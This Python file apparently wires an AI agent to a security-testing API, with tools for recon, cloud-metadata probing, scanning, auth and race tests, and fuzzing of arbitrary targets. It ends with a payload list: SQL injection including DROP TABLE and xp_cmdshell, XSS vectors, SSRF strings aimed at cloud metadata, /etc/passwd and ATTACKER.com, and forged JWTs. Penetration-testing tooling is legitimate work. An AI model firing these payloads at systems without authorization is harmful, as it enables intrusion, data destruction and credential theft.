"""
LangChain tools — async wrappers around BluJay's REST API.

All tools call http://localhost:8000/api/v1/* using httpx so the LangGraph
agent nodes stay decoupled from FastAPI's dependency-injection system.
"""
import os

import httpx
from langchain_core.tools import tool

BASE = os.getenv("BLUJAY_BASE_URL", "http://localhost:8000/api/v1")
TIMEOUT = httpx.Timeout(120.0)


# ── Recon ─────────────────────────────────────────────────────────────────────

@tool
async def recon_target(target_url: str) -> dict:
    """Run passive + active recon: subdomain enum, open ports, TLS info, bucket discovery."""
    async with httpx.AsyncClient(timeout=TIMEOUT) as c:
        resp = await c.post(f"{BASE}/recon/scan", json={"target": target_url})
        resp.raise_for_status()
        return resp.json()


@tool
async def audit_tls(hostname: str) -> dict:
    """Audit TLS/SSL configuration — cipher suites, cert chain, protocol versions."""
    async with httpx.AsyncClient(timeout=TIMEOUT) as c:
        resp = await c.post(f"{BASE}/tls/audit", json={"host": hostname})
        resp.raise_for_status()
        return resp.json()


@tool
async def probe_cloud_metadata(target_url: str) -> dict:
    """Probe for IMDS, exposed S3/GCS/Azure buckets, and cloud credential leaks."""
    async with httpx.AsyncClient(timeout=TIMEOUT) as c:
        resp = await c.post(f"{BASE}/cloud/test", json={"target_url": target_url})
        resp.raise_for_status()
        return resp.json()


# ── Web / API exploit ─────────────────────────────────────────────────────────

@tool
async def scan_active(target_url: str, checks: list[str] | None = None) -> dict:
    """Run BluJay's active web scanner — XSS, SQLi, SSRF, path traversal, open redirect."""
    payload = {"url": target_url, "checks": checks or ["xss", "sqli", "ssrf", "path_traversal", "open_redirect"]}
    async with httpx.AsyncClient(timeout=TIMEOUT) as c:
        resp = await c.post(f"{BASE}/scanner/active", json=payload)
        resp.raise_for_status()
        return resp.json()


@tool
async def test_auth(target_url: str, login_endpoint: str = "/api/login") -> dict:
    """Test for auth vulnerabilities — JWT flaws, OAuth misconfig, session replay, token stripping."""
    payload = {"base_url": target_url, "login_endpoint": login_endpoint}
    async with httpx.AsyncClient(timeout=TIMEOUT) as c:
        resp = await c.post(f"{BASE}/auth/test", json=payload)
        resp.raise_for_status()
        return resp.json()


@tool
async def test_race_condition(target_url: str, endpoint: str, method: str = "POST") -> dict:
    """Test endpoint for race conditions — concurrent request replay with timing analysis."""
    payload = {"url": target_url, "endpoint": endpoint, "method": method, "concurrency": 20}
    async with httpx.AsyncClient(timeout=TIMEOUT) as c:
        resp = await c.post(f"{BASE}/race/test", json=payload)
        resp.raise_for_status()
        return resp.json()


@tool
async def fuzz_parameters(target_url: str, param_names: list[str]) -> dict:
    """Fuzz HTTP parameters with injection and boundary payloads."""
    payload = {"url": target_url, "params": param_names}
    async with httpx.AsyncClient(timeout=TIMEOUT) as c:
        resp = await c.post(f"{BASE}/fuzzing/fuzz", json=payload)
        resp.raise_for_status()
        return resp.json()


@tool
async def lookup_cve(package_name: str, version: str = "") -> dict:
    """Look up known CVEs for a package/version from NVD and Nuclei templates."""
    async with httpx.AsyncClient(timeout=TIMEOUT) as c:
        resp = await c.get(f"{BASE}/vuln/intel", params={"package": package_name, "version": version})
        resp.raise_for_status()
        return resp.json()


# ── Variant generators ────────────────────────────────────────────────────────

VARIANT_PAYLOADS: dict[str, list[str]] = {
    "sqli": [
        "' OR 1=1--", "' OR '1'='1", "1; DROP TABLE users--", "' UNION SELECT null,null--",
        "1 AND SLEEP(5)--", "1' AND 1=CONVERT(int,@@version)--", "admin'--", "' OR 1=1#",
        "') OR ('1'='1", "1' OR '1'='1'--", "'; EXEC xp_cmdshell('whoami')--",
        "1; WAITFOR DELAY '0:0:5'--", "' OR EXISTS(SELECT 1)--", "1 OR 1=1",
        "' OR BENCHMARK(1000000,MD5('test'))--",
    ],
    "xss": [
        "<script>alert(1)</script>", "<img src=x onerror=alert(1)>",
        "javascript:alert(1)", "<svg onload=alert(1)>",
        "<body onload=alert(1)>", "'-alert(1)-'",
        "\"><script>alert(1)</script>", "<iframe src=javascript:alert(1)>",
        "<input autofocus onfocus=alert(1)>", "<details open ontoggle=alert(1)>",
        "<<SCRIPT>alert('XSS');//<</SCRIPT>", "<IMG SRC=`javascript:alert(\"XSS\")`>",
        "%3cscript%3ealert(1)%3c/script%3e", "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
        "<scr<script>ipt>alert(1)</scr</script>ipt>",
    ],
    "ssrf": [
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://localhost:80", "http://127.0.0.1:22",
        "http://[::1]:80", "file:///etc/passwd",
        "dict://localhost:11211/stats", "gopher://localhost:6379/_INFO",
        "http://0177.0.0.1/", "http://2130706433/",
        "http://localhost.ATTACKER.com/", "http://169.254.169.254@ATTACKER.com/",
    ],
    "idor": [f"id={i}" for i in range(1, 20)],
    "auth": [
        "Bearer null", "Bearer undefined", "Bearer 0",
        "Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiIxIn0.",  # alg:none
        "", "Bearer ../../etc/passwd",
    ],
    "race": ["concurrent_10", "concurrent_25", "concurrent_50", "concurrent_100"],
}


def get_variants(finding_type: str) -> list[str]:
    """Return payload variants for a given finding category."""
    key = finding_type.lower().replace(" ", "_").replace("-", "_")
    for k in VARIANT_PAYLOADS:
        if k in key:
            return VARIANT_PAYLOADS[k]
    return []
